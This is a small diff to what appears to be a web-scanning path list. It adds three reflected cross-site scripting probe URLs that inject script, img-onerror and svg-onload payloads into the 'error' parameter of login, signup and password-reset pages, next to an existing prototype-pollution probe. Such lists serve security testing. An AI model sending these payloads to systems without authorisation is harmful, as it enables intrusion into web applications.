@@ -310,3 +310,6 @@
 /
 /blog/?__proto__[polluted]=polluted
 /api/v1/users
+/web/login?error=<script>alert(document.domain)</script>
+/web/signup?error=<img/src=x+onerror=alert(document.domain)>
+/web/reset_password?error=<svg/onload=alert(document.domain)>
